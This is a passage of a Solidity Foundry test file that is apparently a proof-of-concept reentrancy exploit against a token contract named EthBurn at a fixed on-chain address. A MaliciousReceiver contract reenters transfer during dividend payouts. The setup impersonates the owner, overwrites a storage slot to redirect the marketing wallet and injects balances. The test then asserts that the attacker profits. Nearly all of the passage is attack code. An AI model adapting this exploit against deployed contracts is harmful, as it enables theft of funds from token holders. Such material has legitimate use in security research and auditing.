    address public target;
    uint256 public reenterCount;

    constructor(address _target) {
        target = _target;
    }

    receive() external payable {
        reenterCount++;
        // Reenter during dividend distribution
        if (reenterCount == 1) {
            // Try to trigger another transfer during the vulnerable window
            try EthBurn(target).transfer(msg.sender, 1) {}
            catch {}
        }
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    MaliciousReceiver maliciousReceiver;
    address constant TARGET = 0xD1c0c25c5d7BA21df222Bd2623eCBC0CB264b5f4;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {

        vm.label(TARGET, "EthBurn Victim");

        // Deploy malicious receiver contract
        maliciousReceiver = new MaliciousReceiver(TARGET);
        vm.label(address(maliciousReceiver), "Malicious Receiver");

        // Impersonate owner to configure the contract
        address owner = EthBurn(TARGET).owner();
        vm.startPrank(owner);

        // Exclude malicious receiver from fees
        EthBurn(TARGET).setExcludeFees(address(maliciousReceiver), true);

        // Use storage manipulation to set marketingWallet (slot 9)
        vm.store(TARGET, bytes32(uint256(9)), bytes32(uint256(uint160(address(maliciousReceiver)))));

        // Enable trading
        EthBurn(TARGET).setTrueDefiRouter(address(0));

        // Disable limits to make testing easier
        EthBurn(TARGET).setLimitsInEffect(false);

        // Lower swapTokensAtAmount so swap triggers with fewer accumulated tokens
        EthBurn(TARGET).setSwapTriggerAmount(100);

        vm.stopPrank();

        // Inject tokens directly to attacker using deal
        deal(TARGET, address(this), 200000 * 1e18);

        // Fund contract with ETH for liquidity operations
        vm.deal(TARGET, 50 ether);

        // Approve router for trading
        IERC20(TARGET).approve(EthBurn(TARGET).uniswapV2Router(), type(uint256).max);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;

        // Transfer tokens multiple times to accumulate fees in contract
        // Each transfer collects fees that go to the contract
        for (uint256 i = 0; i < 5; i++) {
            IERC20(TARGET).transfer(address(0xdead), 10000 * 1e18);
        }

        // Now trigger a sell by transferring to the AMM pair
        // This should trigger swapAndSendDividends since contract has accumulated tokens
        address pair = EthBurn(TARGET).uniswapV2Pair();
        IERC20(TARGET).transfer(pair, 50000 * 1e18);

        // Check profit - attacker should have received ETH through malicious marketingWallet
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Attacker did not profit from reentrancy");
    }



    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

